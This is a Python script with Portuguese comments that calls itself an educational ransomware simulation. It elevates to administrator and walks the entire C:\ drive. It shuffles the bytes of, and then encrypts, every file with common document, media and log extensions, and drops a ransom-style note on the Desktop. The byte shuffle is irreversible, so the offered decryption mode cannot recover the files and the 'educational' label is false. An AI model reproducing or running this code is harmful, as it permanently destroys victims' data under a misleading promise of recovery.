import os
import random
import string
import base64
import ctypes
import sys
from cryptography.fernet import Fernet

# ==== CONFIGURAÇÕES ====
TARGET_EXTENSIONS = ['.txt', '.docx', '.pdf', '.png', '.jpg', '.mp3', '.mp4', '.log']
DECRYPTION_PASSWORD = 'D3XTP0W3R2025'
PASSWORD_HINT_FILE = 'LEIA_ISSO_IMPORTANTE.txt'

# ==== GERAÇÃO DE CHAVE COM BASE NA SENHA ====
def generate_key(password):
    padded = password.ljust(32, '0')[:32]  # Padding para 32 bytes
    return base64.urlsafe_b64encode(padded.encode())

# ==== CRIPTOGRAFIA ====
def encrypt_file(filepath, fernet):
    try:
        with open(filepath, 'rb') as file:
            original = file.read()
        encrypted = fernet.encrypt(original)
        with open(filepath, 'wb') as file:
            file.write(encrypted)
        print(f'Arquivo criptografado: {filepath}')
    except Exception as e:
        print(f'Erro ao criptografar {filepath}: {e}')

# ==== BAGUNÇA DE CONTEÚDO (simulada) ====
def scramble_content(filepath):
    try:
        with open(filepath, 'rb') as file:
            content = file.read()
        scrambled = bytearray(content)
        random.shuffle(scrambled)
        with open(filepath, 'wb') as file:
            file.write(scrambled)
        print(f'Conteúdo embaralhado: {filepath}')
    except Exception as e:
        print(f'Erro ao embaralhar {filepath}: {e}')

# ==== CRIA AVISO ====
def create_hint_file():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    hint_path = os.path.join(desktop_path, PASSWORD_HINT_FILE)
    with open(hint_path, 'w', encoding='utf-8') as f:
        f.write(
            "SEUS ARQUIVOS FORAM ALTERADOS PELO PROJETO DEXT.\n"
            "PARA RECUPERAR, USE A SENHA: D3XTP0W3R2025\n"
            "Este processo é apenas educacional e fictício.\n"
        )
    print(f'Aviso criado em: {hint_path}')

# ==== PERMISSÃO DE ADMINISTRADOR (Windows) ====
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# ==== FUNÇÃO PRINCIPAL ====
def simulate_infection():
    if not is_admin():
        print("Reiniciando como administrador...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        exit()

    key = generate_key(DECRYPTION_PASSWORD)
    fernet = Fernet(key)

    for root, _, files in os.walk("C:\\"):
        for filename in files:
            if any(filename.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
                filepath = os.path.join(root, filename)
                scramble_content(filepath)
                encrypt_file(filepath, fernet)

    create_hint_file()
    print('Infecção simulada completa.')

# ==== DESCRIPTOGRAFIA ====
def decrypt_files(password):
    key = generate_key(password)
    fernet = Fernet(key)

    for root, _, files in os.walk("C:\\"):
        for filename in files:
            if any(filename.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
                filepath = os.path.join(root, filename)
                try:
                    with open(filepath, 'rb') as file:
                        encrypted = file.read()
                    decrypted = fernet.decrypt(encrypted)
                    with open(filepath, 'wb') as file:
                        file.write(decrypted)
                    print(f'Arquivo recuperado: {filepath}')
                except Exception as e:
                    print(f'Erro ao descriptografar {filepath}: {e}')

# ==== EXECUÇÃO ====
if __name__ == '__main__':
    modo = input('Digite "1" para simular infecção ou "2" para restaurar os arquivos: ')
    if modo == '1':
        simulate_infection()
    elif modo == '2':
        senha = input('Digite a senha para descriptografar: ')
        decrypt_files(senha)
    else:
        print('Opção inválida.')
